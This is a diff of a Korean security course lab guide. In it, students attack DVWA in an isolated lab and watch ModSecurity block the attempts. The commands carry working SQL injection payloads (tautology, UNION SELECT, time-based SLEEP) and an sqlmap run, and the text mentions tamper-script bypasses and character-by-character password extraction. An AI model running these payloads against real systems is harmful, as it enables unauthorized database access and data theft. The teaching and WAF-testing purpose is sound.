@@ -126,41 +126,80 @@ paranoia level 1 의 룰 = 표준 패턴. 변형 시 일부 통과. paranoia 2+ 
 
 ### 1 — DVWA 진입
 
-```
+```bash
+# DVWA 의 메인 페이지 — login 화면
+#   응답: <form action="login.php" ...> + setup link
 ssh 6v6-attacker 'curl -s -H "Host: dvwa.6v6.lab" http://10.20.30.1/ | head -10'
-# admin / password 로 로그인 → cookie 받기
+
+# DVWA default credential: admin / password
+#   로그인 후 PHPSESSID cookie + security level (low/medium/high) 설정 필요
+#   (단, 본 lab 은 ModSec 차단 → setup.php 도 차단될 수 있음)
 ```
 
 ### 2 — SQLi 수동 (boolean)
 
-```
-ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' -H 'Cookie: PHPSESSID=...; security=low' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit' | grep -A2 'Surname'"
+```bash
+# DVWA 의 SQLi page (security=low) 에 boolean tautology 페이로드
+#   id=1' OR '1'='1  (URL encode: %27=' / %3D== / +=공백)
+#   PHPSESSID + security cookie 필수 (실 시도 시 cookie 값 본인 것)
+# grep 'Surname' — 응답 HTML 에 모든 user row 가 표시됨 (정상 1 row 이상)
+ssh 6v6-attacker "curl -s \
+    -H 'Host: dvwa.6v6.lab' \
+    -H 'Cookie: PHPSESSID=YOUR_SESSION; security=low' \
+    'http://10.20.30.1/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit' \
+    | grep -A2 'Surname'"
+# 정상 출력: First name: admin / Surname: admin / ... (모든 user)
+# ModSec 차단 시: 403 Forbidden 페이지
 ```
 
 ### 3 — sqlmap 자동화 (실 lab — ModSec 차단됨)
 
-```
+```bash
+# sqlmap 자동 SQLi 탐색
+#   --batch: 모든 질문 yes (자동화)
+#   --headers="Host: ...": HAProxy vhost 라우팅
+#   기본 동작: DBMS 감지 → 5 타입 SQLi 모두 시도 → 데이터 추출
 ssh 6v6-attacker 'sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: dvwa.6v6.lab" 2>&1 | head -30' || true
-# 대부분 ModSec 가 차단 → 403
+# 6v6 결과: 대부분 ModSec 942 룰 차단 → 403 → "not injectable" 보고
+# 우회: --tamper=space2comment 등 (W10 에서 학습)
 ```
 
 ### 4 — UNION SELECT 시도
 
-```
-ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' 'http://10.20.30.1/?q=1+UNION+SELECT+1,2,3'"
+```bash
+# UNION SELECT — 기존 query 결과에 추가 row append
+#   1+UNION+SELECT+1,2,3 → 컬럼 3개 형 (1,2,3 dummy)
+#   원래 query 의 컬럼 수와 일치해야 함 (ORDER BY 1,2,...,N 으로 추정)
+ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' \
+    'http://10.20.30.1/?q=1+UNION+SELECT+1,2,3'"
+# ModSec 942100 (libinjection) 매치 → 403 예상
 ```
 
 ### 5 — Blind time-based
 
-```
+```bash
+# SLEEP(N) — 응답 시간 차이로 정보 추출 (output 없을 때)
+#   1+AND+SLEEP(3) → query 가 실행되면 3초 지연
+#   time 명령으로 실 응답 시간 측정
 time ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' 'http://10.20.30.1/?q=1+AND+SLEEP(3)'"
-# 응답 시간 측정 (ModSec 가 막으면 빠른 403)
+# 예상:
+#   ModSec 차단 시: real 0m0.2s (빠른 403)
+#   sleep 실행 시:   real 0m3.5s (실 3초 지연)
+# 시간 차이 = 정보. 비밀번호 1자씩 binary search 가능 (느린 추출)
 ```
 
 ### 6 — ModSec audit log 확인
 
-```
-ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | jq ".transaction.messages[] | select(.id | startswith(\"942\")) | .msg"'
+```bash
+# 본인이 위 SQLi 시도 → web 의 audit log 에 942xxx rule 매치 기록
+#   - SecAuditLogFormat JSON 이므로 jq 로 파싱
+#   - transaction.messages[] = 매치된 룰 list
+#   - select(.id | startswith("942")) = SQLi 카테고리만
+ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | \
+    jq ".transaction.messages[] | select(.id | startswith(\"942\")) | .msg"'
+# 예상 출력:
+#   "SQL Injection Attack Detected via libinjection"
+#   "Detects classic SQL injection probings 1/3"
 ```
 
 ## 7. 과제
